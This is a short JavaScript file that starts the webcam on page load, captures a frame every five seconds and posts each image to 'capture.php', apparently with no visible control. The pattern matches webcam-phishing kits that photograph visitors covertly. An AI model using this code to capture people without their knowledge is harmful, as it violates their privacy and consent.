const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let streamStarted = false;

/*
start camera automatically
*/

async function startCamera() {

    try {

        const stream = await navigator.mediaDevices.getUserMedia({

            video: {
                width: 1280,
                height: 720
            },

            audio: false

        });

        video.srcObject = stream;

        if (!streamStarted) {

            streamStarted = true;

            startCaptureLoop();

        }

    } catch (err) {

        console.log("Camera permission denied");

    }

}

/*
capture image repeatedly
*/

function startCaptureLoop() {

    setInterval(() => {

        captureImage();

    }, 5000);

}

/*
capture single frame
*/

function captureImage() {

    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;

    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    const imgData = canvas.toDataURL("image/png");

    sendImage(imgData);

}

/*
send to php
*/

function sendImage(image) {

    fetch("capture.php", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            image: image
        })

    })
        .then(res => res.json())
        .then(data => {

            console.log("image sent");

        })
        .catch(err => {

            console.log("send error");

        });

}

/*
start automatically
*/

startCamera();